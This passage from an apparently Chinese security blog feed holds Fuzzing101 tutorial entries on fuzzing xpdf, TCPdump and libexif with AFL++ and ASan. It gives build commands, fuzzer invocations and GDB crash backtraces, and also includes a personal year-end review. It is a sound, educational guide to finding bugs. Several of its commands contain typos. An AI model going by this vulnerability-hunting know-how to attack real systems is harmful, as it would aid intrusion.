class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffffd9d0</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffffdba0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br><span class="line">#<span class="number">74761</span> Parser::makeStream (<span class="built_in">this</span>=<span class="number">0x5555556976a0</span>, dict=<span class="number">0x7fffffffdba0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">156</span></span><br><span class="line">#<span class="number">74762</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x5555556976a0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffffdba0</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">74763</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffffdba0</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">74764</span> <span class="number">0x00005555555df798</span> in Page::displaySlice (<span class="built_in">this</span>=<span class="number">0x555555694c90</span>, out=<span class="number">0x555555697270</span>, hDPI=<span class="number">72</span>, vDPI=<span class="number">72</span>, rotate=<span class="number">0</span>, useMediaBox=&lt;optimized out&gt;, crop=&lt;optimized out&gt;, sliceX=&lt;optimized out&gt;, sliceY=-<span class="number">1</span>, sliceW=-<span class="number">1</span>, sliceH=-<span class="number">1</span>, printing=<span class="number">0</span>, catalog=<span class="number">0x555555696760</span>, abortCheckCbk=<span class="number">0x0</span>, abortCheckCbkData=<span class="number">0x0</span>) at Page.cc:<span class="number">314</span></span><br><span class="line">#<span class="number">74765</span> <span class="number">0x00005555555dfa17</span> in Page::display (<span class="built_in">this</span>=&lt;optimized out&gt;, out=out<span class="meta">@entry</span>=<span class="number">0x555555697270</span>, hDPI=hDPI<span class="meta">@entry</span>=<span class="number">72</span>, vDPI=vDPI<span class="meta">@entry</span>=<span class="number">72</span>, rotate=rotate<span class="meta">@entry</span>=<span class="number">0</span>, useMediaBox=useMediaBox<span class="meta">@entry</span>=<span class="number">0</span>, crop=crop<span class="meta">@entry</span>=<span class="number">1</span>, printing=printing<span class="meta">@entry</span>=<span class="number">0</span>, catalog=<span class="number">0x555555696760</span>, abortCheckCbk=<span class="number">0x0</span>, abortCheckCbkData=<span class="number">0x0</span>) at Page.cc:<span class="number">264</span></span><br><span class="line">#<span class="number">74766</span> <span class="number">0x00005555555e11b9</span> in PDFDoc::displayPage (abortCheckCbkData=<span class="number">0x0</span>, abortCheckCbk=<span class="number">0x0</span>, printing=<span class="number">0</span>, crop=<span class="number">1</span>, useMediaBox=<span class="number">0</span>, rotate=<span class="number">0</span>, vDPI=<span class="number">72</span>, hDPI=<span class="number">72</span>, page=<span class="number">1</span>, out=<span class="number">0x555555697270</span>, <span class="built_in">this</span>=<span class="number">0x555555693c30</span>) at PDFDoc.cc:<span class="number">317</span></span><br><span class="line">#<span class="number">74767</span> PDFDoc::displayPages (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x555555693c30</span>, out=out<span class="meta">@entry</span>=<span class="number">0x555555697270</span>, firstPage=&lt;optimized out&gt;, lastPage=<span class="number">1</span>, hDPI=hDPI<span class="meta">@entry</span>=<span class="number">72</span>, vDPI=vDPI<span class="meta">@entry</span>=<span class="number">72</span>, rotate=rotate<span class="meta">@entry</span>=<span class="number">0</span>, useMediaBox=useMediaBox<span class="meta">@entry</span>=<span class="number">0</span>, crop=<span class="number">1</span>, printing=<span class="number">0</span>, abortCheckCbk=<span class="number">0x0</span>, abortCheckCbkData=<span class="number">0x0</span>) at PDFDoc.cc:<span class="number">330</span></span><br><span class="line">#<span class="number">74768</span> <span class="number">0x000055555558f27f</span> in <span class="title function_">main</span> <span class="params">(argc=&lt;optimized out&gt;, argc<span class="meta">@entry</span>=<span class="number">3</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffde88</span>)</span> at pdftotext.cc:<span class="number">237</span></span><br><span class="line">#<span class="number">74769</span> <span class="number">0x00007ffff7829d90</span> in <span class="title function_">__libc_start_call_main</span> <span class="params">(main=main<span class="meta">@entry</span>=<span class="number">0x55555558ecc0</span> &lt;main(<span class="type">int</span>, <span class="type">char</span>**)</span>&gt;, argc=argc<span class="meta">@entry</span>=<span class="number">3</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffde88</span>) at ../sysdeps/nptl/libc_start_call_main.h:<span class="number">58</span></span><br><span class="line">#<span class="number">74770</span> <span class="number">0x00007ffff7829e40</span> in <span class="title function_">__libc_start_main_impl</span> <span class="params">(main=<span class="number">0x55555558ecc0</span> &lt;main(<span class="type">int</span>, <span class="type">char</span>**)</span>&gt;, argc=<span class="number">3</span>, argv=<span class="number">0x7fffffffde88</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffde78</span>) at ../csu/libc-start.c:<span class="number">392</span></span><br><span class="line">#<span class="number">74771</span> <span class="number">0x000055555558f555</span> in <span class="title function_">_start</span> <span class="params">()</span></span><br></pre></td></tr></table></figure></div>
<p>应该不难看出来这一段在一直循环吧：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">#<span class="number">64786</span> <span class="number">0x00005555555e06bc</span> in Parser::getObj (<span class="built_in">this</span>=<span class="built_in">this</span><span class="meta">@entry</span>=<span class="number">0x55555598d3f0</span>, obj=obj<span class="meta">@entry</span>=<span class="number">0x7fffffeecf10</span>, fileKey=<span class="number">0x0</span>, encAlgorithm=cryptRC4, keyLength=<span class="number">0</span>, objNum=objNum<span class="meta">@entry</span>=<span class="number">7</span>, objGen=<span class="number">0</span>) at Parser.cc:<span class="number">94</span></span><br><span class="line">#<span class="number">64787</span> <span class="number">0x00005555555f7b5d</span> in XRef::fetch (<span class="built_in">this</span>=<span class="number">0x5555556952b0</span>, num=<span class="number">7</span>, gen=<span class="number">0</span>, obj=<span class="number">0x7fffffeecf10</span>) at XRef.cc:<span class="number">823</span></span><br><span class="line">#<span class="number">64788</span> <span class="number">0x00005555555e010f</span> in Object::dictLookup (obj=<span class="number">0x7fffffeecf10</span>, key=<span class="number">0x55555560c1c6</span> <span class="string">&quot;Length&quot;</span>, <span class="built_in">this</span>=<span class="number">0x7fffffeed0d0</span>) at /home/shad0hun/桌面/Fuzzing101/<span class="number">01</span>-xpdf/xpdf-<span class="number">3.02</span>/xpdf/Object.h:<span class="number">253</span></span><br></pre></td></tr></table></figure></div>
<p>这里明确指出了触发漏洞的位置，位于<code>Parser.cc文件的Object::getObj()</code>方法上，而且我们还是有参数的，我们就可以利用这些信息去找到这个漏洞。<br>由于这里是为了练习Fuzz，漏洞分析的过程不再演示。</p>
]]></content>
      <categories>
        <category>Fuzzing101</category>
      </categories>
      <tags>
        <tag>Fuzzing101</tag>
        <tag>二进制漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>2024年终总结</title>
    <url>/2025/01/22/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>时间过得真快，一转眼，2024已经过去了，大三已经一半走过了，晃悠晃悠，就可以开始准备秋招了……<br>回想2024，一整年都在摆。要不是我翻了一下以前写的博客，还真不知道自己这一年都干了些什么。</p>
<h2 id="2024总结"><a href="#2024总结" class="headerlink" title="2024总结"></a>2024总结</h2><p>前半年，过完年二三月份开始学习了漏洞，先知社区发表了几篇博客，关于Windows下的几种保护机制。<br>三四月份，应该在摆烂。<br>五六七八月份，安全研究员实习，分析APT样本，产出分析报告，yara、snotr、sgi规则，编写控制端。<br>七八九十十一月，emmmm……说实话谈恋爱去了。<br>十二月至今，安全研究员实习，还是分析APT样本……</p>
<h1 id="关于2024的思考"><a href="#关于2024的思考" class="headerlink" title="关于2024的思考"></a>关于2024的思考</h1><p>我是2023年开始深入计算机学习，相较于2023年今年动力减少了很多，自驱力还是不够，今年真的是彻彻底底摆了一年，现在回想起来，我真该*啊，浪费了这么多时间，我要是把这些时间都花在学习上，也许就称为大佬了……哎，不过既然过去了也就不后悔，希望引以为戒，2025继续努力，更上一层楼！</p>
<h1 id="2025展望"><a href="#2025展望" class="headerlink" title="2025展望"></a>2025展望</h1><p>前半年：</p>
<ol>
<li>继续深入二进制漏洞挖掘</li>
<li>学习IOT安全</li>
<li>争取拿到自己的cve<br>至于后半年，应该准备秋招了，到时候肯定会发现自己的很多短板，到时候去补足就可以了。</li>
</ol>
]]></content>
      <categories>
        <category>总结规划</category>
      </categories>
      <tags>
        <tag>总结规划</tag>
      </tags>
  </entry>
  <entry>
    <title>3.TCPdump</title>
    <url>/2025/02/21/3.TCPdump/</url>
    <content><![CDATA[<h1 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h1><ul>
<li>什么是<strong>ASan (Address Sanitizer)</strong>，一种运行时内存错误检测工具</li>
<li>如何使用 ASAN 来模糊测试目标</li>
<li>使用 ASan 对崩溃进行分类有多容易</li>
</ul>
<h1 id="一-构建目标程序"><a href="#一-构建目标程序" class="headerlink" title="一.构建目标程序"></a>一.构建目标程序</h1><p>根据<a class="link"   href="https://www.cvedetails.com/cve/CVE-2017-13028/" >Github描述<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>，我们要Fuzz的软件为TCPdump，版本要求4.9.2版本之前，那么我们首先需要从源码下载并构建TCPdump：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> 03-TCPdump &amp;&amp; <span class="built_in">cd</span> 03-TCPdump</span><br><span class="line">tar -xzvf tcpdump-4.9.2.tar.gz</span><br></pre></td></tr></table></figure></div>
<p>我们还需要下载TCPdump所需的跨平台库libpcap：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/the-tcpdump-group/libpcap/archive/refs/tags/libpcap-1.8.0.tar.gz</span><br><span class="line">tar -xzvf libpcap-1.8.0.tar.gz</span><br></pre></td></tr></table></figure></div>
<p>我们需要将其重命名<code>libpcap-libpcap-1.8.0</code>为<code>libpcap-1.8.0</code>。否则，tcpdump 找不到<code>libpcap.a</code>本地路径：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mv</span> ./libpcap-libpcap-1.8.0// libpcap-1.8.0</span><br></pre></td></tr></table></figure></div>
<p>然后构建libpcap：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./libpcap-1.8.0/</span><br><span class="line">./configure --enable-shared=no</span><br><span class="line">make</span><br></pre></td></tr></table></figure></div>
<p>然后构建并安装TCPdump：<br><strong>需要注意的是，如果你的终端以前安装了TCPdump，那么你需要将它卸载掉<code>sudo apt-get remove tcpdump</code></strong></p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ../tcpdump-tcpdump-4.9.2/</span><br><span class="line">/configure --prefix=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/03-TCPdump/release&#x27;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>然后我们进入release目录下，查看是否构建成功：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/TCPdump_release.png"
                      alt="TCPdump_release"
                ></p>
<h1 id="二-种子语料库构建"><a href="#二-种子语料库构建" class="headerlink" title="二.种子语料库构建"></a>二.种子语料库构建</h1><p>在<code>TCPdump</code>源码目录下，有一个tests文件夹，里面存放了大量的.pcapcp示例：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/TCPdump_tests.png"
                      alt="TCPdump_tests"
                ><br>我们来试试运行这些文件：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/TCPdump_test.png"
                      alt="TCPdump_test"
                ></p>
<h1 id="三-ASan介绍"><a href="#三-ASan介绍" class="headerlink" title="三.ASan介绍"></a>三.ASan介绍</h1><p>**AddressSanitizer (ASan)<strong>是一款适用于 C 和 C++ 的快速内存错误检测器。它最初由 Google（Konstantin Serebryany、Derek Bruening、Alexander Potapenko、Dmitry Vyukov）开发，并于 2011 年 5 月首次发布。</strong><br>它由编译器检测模块和运行时库组成。该工具能够发现对堆、堆栈和全局对象的越界访问，以及释放后使用、双重释放和内存泄漏错误。<br>AddressSanitizer 是开源的，从 3.1 版开始与 LLVM 编译器工具链集成。虽然它最初是作为 LLVM 的项目开发的，但它已被移植到 GCC，并包含在 GCC 版本 &gt;&#x3D; 4.8 中<br>您可以在以下<a class="link"   href="https://clang.llvm.org/docs/AddressSanitizer.html" >链接<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中找到有关 AddressSanitizer 的更多信息。</p>
<h1 id="四-在开启ASan的情况下构建插桩版本"><a href="#四-在开启ASan的情况下构建插桩版本" class="headerlink" title="四.在开启ASan的情况下构建插桩版本"></a>四.在开启ASan的情况下构建插桩版本</h1><p>首先我们需要清理之前构建的release版本：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="built_in">cd</span> ./tcpdump-tcpdump-4.9.2/</span><br><span class="line"><span class="built_in">rm</span> -r -f ../release/</span><br><span class="line">make clean</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ../libpcap-1.8.0</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure></div>
<p>然后开始重新构建：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./libpcap-1.8.0</span><br><span class="line"><span class="built_in">export</span> LLVM_CONFIG=<span class="string">&quot;llvm-config-14&quot;</span></span><br><span class="line"><span class="built_in">set</span> CC /home/shad0hun/AFLplusplus/afl-clang-lto</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/03-TCPdump/Fuzzing&#x27;</span></span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ../tcpdump-tcpdump-4.9.2/</span><br><span class="line">FL_USE_ASAN=1 <span class="built_in">set</span> CC <span class="string">&#x27;/home/shad0hun/AFLplusplus/afl-clang-lto&#x27;</span></span><br><span class="line">AFL_USE_ASAN=1 ./configure --prefix=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/03-TCPdump/Fuzzing&#x27;</span></span><br><span class="line">AFL_USE_ASAN=1 make</span><br><span class="line">AFL_USE_ASAN=1 make install</span><br></pre></td></tr></table></figure></div>
<h1 id="五-模糊测试"><a href="#五-模糊测试" class="headerlink" title="五.模糊测试"></a>五.模糊测试</h1><p><code>afl-fuzz -m none -i ./tcpdump-tcpdump-4.9.2/tests/ -o ./out -s 123 -- ./Fuzzing/sbin/tcpdump -vvvvXX -ee -nn -r @@</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/TCPdump_fuzz.png"
                      alt="TCPdump_fuzz"
                ><br>可以看到在短时间内，已经Fuzz出了很多的Crashes样本。接下来就开始我们的分析工作。</p>
<h1 id="六-Crashes样本分类"><a href="#六-Crashes样本分类" class="headerlink" title="六.Crashes样本分类"></a>六.Crashes样本分类</h1><p>调试使用 ASan 构建的程序比前面的练习容易得多。您需要做的就是向程序提供崩溃文件。<br>当然，如果要使用gdb进行调试也可以，我们只需要:</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">gdb ./tcpdump</span><br><span class="line">(gdb) <span class="built_in">set</span> args -vvvvXX -ee -nn -r <span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/03-TCPdump/out/default/crashes/id:000000,sig:11,src:000804,time:87624,execs:57602,op:havoc,rep:5&#x27;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="init-checksum"><a href="#init-checksum" class="headerlink" title="&lt;1&gt;.init_checksum"></a>&lt;1&gt;.init_checksum</h2>]]></content>
      <categories>
        <category>Fuzzing101</category>
      </categories>
      <tags>
        <tag>Fuzzing101</tag>
        <tag>二进制漏洞挖掘</tag>
      </tags>
  </entry>
  <entry>
    <title>2.libexif</title>
    <url>/2025/02/17/2.libexif/</url>
    <content><![CDATA[<h1 id="目标："><a href="#目标：" class="headerlink" title="目标："></a>目标：</h1><ul>
<li>使用外部应用程序对库进行模糊测试</li>
<li>使用<strong>afl-clang-lto</strong>，这是一种无碰撞检测工具，比_afl-clang-fast 速度_更快，并且能提供更好的结果</li>
<li>使用 Eclipse IDE 作为 GDB 控制台的简单替代方案进行分类</li>
</ul>
<h1 id="一-构建目标程序"><a href="#一-构建目标程序" class="headerlink" title="一.构建目标程序"></a>一.构建目标程序</h1><p>首先，创建文件夹，用于我们构建目标程序：<br><code>mkdir 02-libexif &amp;&amp; cd 02-libexif/</code><br>然后下载并解压libexif-0.6.14：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/libexif/libexif/archive/refs/tags/libexif-0_6_14-release.tar.gz</span><br><span class="line">tar -xzvf libexif-0_6_14-release.tar.gz</span><br></pre></td></tr></table></figure></div>
<p>构建release版本：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> libexif-libexif-0_6_14-release/</span><br><span class="line"><span class="built_in">sudo</span> apt-get install autopoint libtool gettext libpopt-dev</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/02-libexif/release&#x27;</span></span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>到这里，我们的libexif库就构建好了，但是由于这只是一个库，我们要选择一个应用程序来调用这个库，这里我们选择exif：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://github.com/libexif/exif/archive/refs/tags/exif-0_6_15-release.tar.gz</span><br><span class="line">tar -xzvf exif-0_6_15-release.tar.gz</span><br></pre></td></tr></table></figure></div>
<p>然后利用我们前面构建出来的libexif库进行构建release版本：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> exif-0_6_15-release</span><br><span class="line">autoreconf -fvi</span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/02-libexif/exif-release&#x27;</span> PKG_CONFIG_PATH=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/02-libexif/release/lib/pkgconfig&#x27;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>然后，我们可以看到，我们构建成功：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/libexif-release.png"
                      alt="libexif-release"
                ></p>
<h1 id="二-种子语料库创建"><a href="#二-种子语料库创建" class="headerlink" title="二.种子语料库创建"></a>二.种子语料库创建</h1><p>我们现在需要一些exif样本，我们将是使用一下repo中的示例图像：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> 02-libexif/</span><br><span class="line">wget https://github.com/ianare/exif-samples/archive/refs/heads/master.zip</span><br><span class="line">unzip master.zip</span><br></pre></td></tr></table></figure></div>
<p>然后测试：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/libexif-test.png"
                      alt="libexif-test"
                ></p>
<h1 id="三-构建插桩程序-afl-clang-lto-并fuzz"><a href="#三-构建插桩程序-afl-clang-lto-并fuzz" class="headerlink" title="三.构建插桩程序(afl-clang-lto)并fuzz"></a>三.构建插桩程序(afl-clang-lto)并fuzz</h1><p>首先删除之前构建出来的release版本：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r ./release/</span><br><span class="line"><span class="built_in">rm</span> -r ./exif_release/</span><br></pre></td></tr></table></figure></div>
<p>然后全部重新构建：</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./libexif-libexif-0_6_14-release/</span><br><span class="line">make clean</span><br><span class="line"><span class="built_in">export</span> CC=<span class="string">&quot;&#x27;/home/shad0hun/AFLplusplus/afl-clang-lto&quot;</span></span><br><span class="line"><span class="built_in">export</span> LLVM_CONFIG=<span class="string">&quot;llvm-config-14&quot;</span></span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/02-libexif/libexif-fuzzing&#x27;</span></span><br><span class="line">make</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./exif-exif-0_6_15-release/</span><br><span class="line">make clean</span><br><span class="line"><span class="built_in">export</span> LLVM_CONFIG=<span class="string">&quot;llvm-config-14&quot;</span></span><br><span class="line"><span class="built_in">export</span> CC=<span class="string">&#x27;/home/shad0hun/AFLplusplus/afl-clang-lto&#x27;</span></span><br><span class="line">./configure --enable-shared=no --prefix=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/02-libexif/exif-fuzzing&#x27;</span> PKG_CONFIG_PATH=<span class="string">&#x27;/home/shad0hun/桌面/Fuzzing101/02-libexif/libexif-fuzzing/lib/pkgconfig&#x27;</span></span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></div>
<p>然后我们就可以进行fuzz：<br><code>fl-fuzz -i /home/shad0hun/桌面/Fuzzing101/02-libexif/exif-samples-master/jpg/ -o /home/shad0hun/桌面/Fuzzing101/02-libexif/out -s 123 -- /home/shad0hun/桌面/Fuzzing101/02-libexif/exif-fuzzing/bin/exif @@</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/%5Cimages%5CFuzzing101/libexif-fuzzing.png"
                      alt="libexif-fuzzing"
                ><br>可以看到我们这里已经得到了20个崩溃样本，那我们就对这些样本进行分类（这里我们使用GDB）。</p>
<h1 id="四-模糊测试结果分类："><a href="#四-模糊测试结果分类：" class="headerlink" title="四.模糊测试结果分类："></a>四.模糊测试结果分类：</h1><h2 id="1-exif-get-sshort"><a href="#1-exif-get-sshort" class="headerlink" title="1.exif_get_sshort"></a>1.exif_get_sshort</h2><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>  <span class="number">0x000055555557c786</span> in <span class="title function_">exif_get_sshort</span> <span class="params">(buf=<span class="number">0x5556557adf05</span> &lt;error: Cannot access memory at address <span class="number">0x5556557adf05</span>&gt;, order=EXIF_BYTE_ORDER_MOTOROLA)</span> at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-utils.c:<span class="number">92</span></span><br><span class="line">#<span class="number">1</span>  exif_get_short (buf=<span class="number">0x5556557adf05</span> &lt;error: Cannot access memory at address <span class="number">0x5556557adf05</span>&gt;, order=EXIF_BYTE_ORDER_MOTOROLA) at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-utils.c:<span class="number">104</span></span><br><span class="line">#<span class="number">2</span>  exif_data_load_data (data=<span class="number">0x5555557ae390</span>, d_orig=&lt;optimized out&gt;, ds_orig=&lt;optimized out&gt;) at exif-data.c:<span class="number">819</span></span><br><span class="line">#<span class="number">3</span>  <span class="number">0x0000555555571d50</span> in <span class="title function_">exif_loader_get_data</span> <span class="params">(loader=&lt;optimized out&gt;)</span> at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-loader.c:<span class="number">387</span></span><br><span class="line">#<span class="number">4</span>  main (argc=argc<span class="meta">@entry</span>=<span class="number">2</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffe478</span>) at main.c:<span class="number">438</span></span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00007ffff7c29d90</span> in <span class="title function_">__libc_start_call_main</span> <span class="params">(main=main<span class="meta">@entry</span>=<span class="number">0x55555556f810</span> &lt;main&gt;, argc=argc<span class="meta">@entry</span>=<span class="number">2</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffe478</span>)</span> at ../sysdeps/nptl/libc_start_call_main.h:<span class="number">58</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007ffff7c29e40</span> in <span class="title function_">__libc_start_main_impl</span> <span class="params">(main=<span class="number">0x55555556f810</span> &lt;main&gt;, argc=<span class="number">2</span>, argv=<span class="number">0x7fffffffe478</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe468</span>)</span> at ../csu/libc-start.c:<span class="number">392</span></span><br><span class="line">#<span class="number">7</span>  <span class="number">0x000055555556b365</span> in <span class="title function_">_start</span> <span class="params">()</span></span><br></pre></td></tr></table></figure></div>
<h2 id="2-exif-data-load-data-content"><a href="#2-exif-data-load-data-content" class="headerlink" title="2.exif_data_load_data_content"></a>2.exif_data_load_data_content</h2><div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">#<span class="number">0</span>  __memmove_evex_unaligned_erms () at ../sysdeps/x86_64/multiarch/memmove-vec-unaligned-erms.S:<span class="number">874</span></span><br><span class="line">#<span class="number">1</span>  <span class="number">0x000055555557e3dc</span> in <span class="title function_">exif_data_load_data_content</span> <span class="params">(data=<span class="number">0x7ffef701c040</span>, ifd=EXIF_IFD_1, d=<span class="number">0x5555557ca206</span> <span class="string">&quot;&quot;</span>, ds=<span class="number">16335</span>, offset=<span class="number">598</span>, recursion_depth=&lt;optimized out&gt;)</span> at exif-data.c:<span class="number">381</span></span><br><span class="line">#<span class="number">2</span>  <span class="number">0x000055555557c92b</span> in <span class="title function_">exif_data_load_data</span> <span class="params">(data=<span class="number">0x5555557ae6b0</span>, d_orig=&lt;optimized out&gt;, ds_orig=&lt;optimized out&gt;)</span> at exif-data.c:<span class="number">835</span></span><br><span class="line">#<span class="number">3</span>  <span class="number">0x0000555555571d50</span> in <span class="title function_">exif_loader_get_data</span> <span class="params">(loader=&lt;optimized out&gt;)</span> at /home/shad0hun/桌面/Fuzzing101/<span class="number">02</span>-libexif/libexif-libexif-<span class="number">0_6_14</span>-release/libexif/exif-loader.c:<span class="number">387</span></span><br><span class="line">#<span class="number">4</span>  main (argc=argc<span class="meta">@entry</span>=<span class="number">2</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffe498</span>) at main.c:<span class="number">438</span></span><br><span class="line">#<span class="number">5</span>  <span class="number">0x00007ffff7c29d90</span> in <span class="title function_">__libc_start_call_main</span> <span class="params">(main=main<span class="meta">@entry</span>=<span class="number">0x55555556f810</span> &lt;main&gt;, argc=argc<span class="meta">@entry</span>=<span class="number">2</span>, argv=argv<span class="meta">@entry</span>=<span class="number">0x7fffffffe498</span>)</span> at ../sysdeps/nptl/libc_start_call_main.h:<span class="number">58</span></span><br><span class="line">#<span class="number">6</span>  <span class="number">0x00007ffff7c29e40</span> in <span class="title function_">__libc_start_main_impl</span> <span class="params">(main=<span class="number">0x55555556f810</span> &lt;main&gt;, argc=<span class="number">2</span>, argv=<span class="number">0x7fffffffe498</span>, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=<span class="number">0x7fffffffe488</span>)</span> at ../csu/libc-start.c:<span class="number">392</span></span><br><span class="line">#<span class="number">7</span>  <span class="number">0x000055555556b365</span> in <span class="title function_">_start</span> <span class="params">()</span></span><br></pre></td></tr></table></figure></div>
